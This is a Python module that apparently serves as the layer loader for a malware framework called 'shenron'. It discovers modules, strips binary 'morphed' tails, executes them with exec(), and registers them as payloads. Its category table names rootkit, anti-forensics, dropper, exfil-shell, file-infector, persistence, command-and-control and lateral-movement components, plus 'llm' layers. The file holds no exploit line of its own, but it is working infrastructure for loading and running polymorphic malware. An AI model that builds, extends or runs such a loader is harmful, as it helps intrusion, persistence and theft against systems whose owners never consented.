#!/usr/bin/env python3
import os, re, sys, types
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from core.engine.path_adapter import patch_source
from core.engine import payload_registry
import sys as _sys
def _log_mutation_safe(layer_type, status, notes=""):
    try:
        import importlib.util, os
        spec = importlib.util.spec_from_file_location(
            "mutation_history",
            os.path.join(os.path.dirname(__file__), "../layers/mutation_history.py")
        )
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        score = "100" if status == "ok" else "0"
        mod.log_mutation(layer_type, status, score, notes)
    except Exception:
        pass

LAYERS_DIR = Path(os.path.expanduser("~/research_hub/repos/shenron/core/layers"))

CATEGORIES = {
    "identity":    ["shenron_bio_replication","forged_bios_artifact","cognitive_replicator","stealth_mimic"],
    "evasion":     ["anti_forensics_molt","airlock_quarantine_cloak","evasion_lure_illusion","mirror_loop_deflector","spectral_rootkit_shroud","dark_signature_morpher",],
    "payload":     ["payload_skinwalker","obfuscated_skinwalker_dropper","deadzone_payload","symbiote_payload","ethereal_payload_reanimator","recursive_payload_seedbank","transient_exfil_shell","void_gateway_tunnel"],
    "persistence": ["dormant_sleeper_seed","undead_memory_latch","memory_hijack_inheritor","shadow_system_rebuilder","self_sealing_nano_sandbox","poltergeist_file_infector"],
    "entropy":     ["quantum_entropy_distorter","entropy_flux_disruptor","entropy_anchor_dropper","neural_entropy_seeder","quantum_state_shuffler","quantum_trace_rewinder","quantum_entanglement_relay","synthetic_splinter_seed"],
    "c2":          ["beacon_emitter_cloak","autonomous_signal_cloner","lateral_webcrawler","parasitic_mesh_crawler","spectral_packet_weaver","temporal_payload_phaser","temporal_mirage_emulator","dreamdive_overlay"],
    "llm":         ["llm_echo_chamber","llm_shroud_writer","dragons_breath_destructor","encrypted_echo_chamber"],
    "meta":        ["mutation_history","polymorph_chain_stats","manifest_vampire","phantom_thread_fabricator","adaptive_brainstem","shenron_holo_emitter"],
}
_TYPE_TO_CAT = {layer: cat for cat, layers in CATEGORIES.items() for layer in layers}

def _get_layer_type(filename):
    stem = Path(filename).stem
    parts = stem.split("_")
    for i, part in enumerate(parts):
        if i == 0:
            continue
        if re.match(r"^[A-Za-z0-9]{6}$", part):
            return None
    return stem

def discover_canonical():
    candidates = {}
    for f in LAYERS_DIR.glob("*.py"):
        lt = _get_layer_type(f.name)
        if lt is None:
            continue
        candidates.setdefault(lt, []).append(f)
    return {lt: sorted(paths, key=lambda p: len(p.name))[0] for lt, paths in candidates.items()}

def _strip_binary(source):
    raw = source if isinstance(source, bytes) else source.encode("utf-8", errors="replace")
    marker = b"#MORPHED"
    idx = 0
    while True:
        pos = raw.find(marker, idx)
        if pos == -1:
            break
        preceding = raw[max(0, pos-8):pos]
        has_binary = any(b > 0x7e or (b < 0x09) or (0x0d < b < 0x20) for b in preceding)
        if has_binary:
            raw = raw[:pos]
            break
        idx = pos + len(marker)
    cleaned = raw.decode("utf-8", errors="replace")
    cleaned = cleaned.replace("\x00", "").replace("\ufffd", "")
    cleaned = re.sub(r"[\x01-\x08\x0b\x0c\x0e-\x1f]", "", cleaned)
    return cleaned

def _make_shim_module(name):
    mod = types.ModuleType(name)
    mod.__path__ = []
    return mod

def load_layer(layer_type, path):
    try:
        raw = path.read_text(encoding="utf-8", errors="replace")
    except Exception as e:
        return False, "read error: " + str(e)
    source = _strip_binary(raw)
    source = patch_source(source)
    source = re.sub(r"^from core\.engine\.payload_registry import.*$", "", source, flags=re.MULTILINE)
    mod = types.ModuleType("shenron.layers." + layer_type)
    mod.__file__ = str(path)
    mod.register_payload = payload_registry.register_payload
    for shim in ["core.engine.payload_registry", "core.engine", "core"]:
        if shim not in sys.modules:
            sys.modules[shim] = _make_shim_module(shim)
    try:
        exec(compile(source, str(path), "exec"), mod.__dict__)
        # Re-register mutation-named entries under canonical name
        for reg_name in list(payload_registry.list_registered()):
            if reg_name != layer_type and reg_name.startswith(layer_type + "_"):
                payload_registry.register_payload(layer_type)(payload_registry.get(reg_name))
                break
        # Auto-register if still not picked up
        if layer_type not in payload_registry.list_registered():
            if hasattr(mod, "main") and callable(mod.main):
                payload_registry.register_payload(layer_type)(mod.main)
            else:
                # No main() — wrap all public functions into one callable
                fns = [
                    v for k, v in mod.__dict__.items()
                    if callable(v) and not k.startswith("_")
                    and getattr(v, "__module__", None) == mod.__name__
                ]
                if fns:
                    def _make_runner(functions):
                        def _runner():
                            for fn in functions:
                                try:
                                    fn()
                                except Exception as e:
                                    print("  [!] " + fn.__name__ + ": " + str(e))
                        return _runner
                    payload_registry.register_payload(layer_type)(_make_runner(fns))
        _log_mutation_safe(layer_type, "loaded")
        return True, None
    except SyntaxError as e:
        _log_mutation_safe(layer_type, "syntax_error", str(e))
        return False, "syntax error: " + str(e)
    except ImportError as e:
        _log_mutation_safe(layer_type, "import_error", str(e))
        return False, "import error: " + str(e)
    except Exception as e:
        _log_mutation_safe(layer_type, "exec_error", str(e))
        return False, "exec error: " + str(e)

def load_all(categories=None):
    canonical = discover_canonical()
    results = {}
    for layer_type, path in sorted(canonical.items()):
        if categories:
            cat = _TYPE_TO_CAT.get(layer_type)
            if cat not in categories:
                continue
        ok, err = load_layer(layer_type, path)
        results[layer_type] = ok
        if not ok:
            print("  [!] " + layer_type + ": " + str(err))
    return results

def get_by_category(category):
    return CATEGORIES.get(category, [])
